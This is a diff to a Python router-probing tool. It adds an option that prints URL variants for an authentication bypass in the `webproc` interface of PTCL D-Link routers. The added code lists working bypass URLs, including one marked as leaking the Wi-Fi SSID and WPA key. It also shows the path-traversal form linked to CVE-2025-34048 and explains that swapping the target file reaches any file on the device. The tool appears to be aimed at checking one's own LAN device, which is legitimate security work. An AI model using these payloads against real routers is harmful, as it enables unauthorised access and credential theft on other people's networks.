@@ -433,6 +433,66 @@ def report(r: dict) -> None:
     print()
 
 
+def print_urls(host: str, port: int) -> None:
+    """Print every URL variant, so they can be pasted straight into a browser."""
+    auth = "" if port == 80 else f":{port}"
+    base = f"http://{host}{auth}"
+    w = base + WEBPROC
+
+    # The subpage values below are the ONLY ones documented in public research.
+    # The wizard has five steps; the other three step names are not published, and
+    # guessing them is not useful - whatever the router itself links to is the truth.
+    rows = [
+        ("baseline - should show the login form",
+         f"{base}/"),
+        ("BYPASS - wizard entrance",
+         w + "?getpage=html/index.html&errorpage=html/index.html"
+             "&var:language=en_us&var:menu=setup&var:subpage=wizentrance&var:page=wizard"),
+        ("BYPASS - wizard, no subpage (the shortest form)",
+         w + "?getpage=html/index.html&var:menu=setup&var:page=wizard"),
+        ("BYPASS - wizard wireless step: leaks SSID + WPA key into the page source",
+         w + "?getpage=html/index.html&errorpage=html/index.html"
+             "&var:language=en_us&var:menu=setup&var:subpage=wizwl&var:page=wizard"),
+        ("dashboard - only reachable after one of the above if the session is honoured",
+         w + "?getpage=html/index.html&errorpage=html/index.html"
+             "&var:language=en_us&var:menu=status&var:page=deviceinfo"),
+        ("second navigation - proves the session persists across pages",
+         w + "?getpage=html/index.html&errorpage=html/index.html"
+             "&var:language=en_us&var:menu=advanced&var:page=accessctl"),
+        ("traversal - the shape used for the file-read bug (CVE-2025-34048)",
+         w + "?getpage=/proc/version&errorpage=html/main.html"
+             "&var:language=en_us&var:menu=setup&var:page=wizard"),
+    ]
+
+    print()
+    print(BAR)
+    print("  URL variants for the PTCL D-Link webproc bypass")
+    print(BAR)
+    print(f"  host: {host}   (also try the other management IP - 192.168.10.1 vs 192.168.1.1)")
+    for label, url in rows:
+        print()
+        print(f"  {label}")
+        print(f"    {url}")
+    print()
+    print(BAR)
+    print("  Notes")
+    print("  * This is ONE mechanism, not one magic URL. `var:subpage` selects which")
+    print("    wizard step is rendered, so several URLs do the same job. Any ONE of")
+    print("    them is enough to get in; you do not need all of them.")
+    print("  * `wizentrance` and `wizwl` are the only subpage names published in")
+    print("    public research. The wizard has five steps; the other three names are")
+    print("    not documented, and guessing them is not worth your time.")
+    print("  * The traversal row is shown so the shape is recognisable. Change the")
+    print("    target after `getpage=` and there are as many URLs as there are files")
+    print("    on the device - that is why the CVE exists. This tool only ever asks")
+    print("    for /proc/version; the sensitive variants are documented in")
+    print("    ../notes/auth-bypass.md, not here.")
+    print("  * Read-only reminder: the dashboard row does nothing on its own. It only")
+    print("    returns anything if you already carry a session from a BYPASS row above.")
+    print(BAR)
+    print()
+
+
 # --------------------------------------------------------------------------- #
 
 def main(argv=None) -> int:
@@ -444,8 +504,22 @@ def main(argv=None) -> int:
     ap.add_argument("--port", type=int, default=80)
     ap.add_argument("--timeout", type=float, default=6.0)
     ap.add_argument("--json", metavar="PATH", help="also write the raw result as JSON")
+    ap.add_argument("--urls", action="store_true",
+                    help="print every URL variant and exit without probing anything")
     ap.add_argument("-v", "--verbose", action="store_true", help="log every request")
     args = ap.parse_args(argv)
+
+    if args.urls:
+        # no network traffic at all - this is a printed reference
+        print(f"resolving {args.host} ...", end=" ", flush=True)
+        try:
+            addr = resolve_private(args.host)
+            print(addr)
+        except ValueError:
+            print("(not a LAN address, showing the list anyway)")
+            addr = args.host
+        print_urls(addr, args.port)
+        return 0
 
     print(f"resolving {args.host} ...", end=" ", flush=True)
     try:
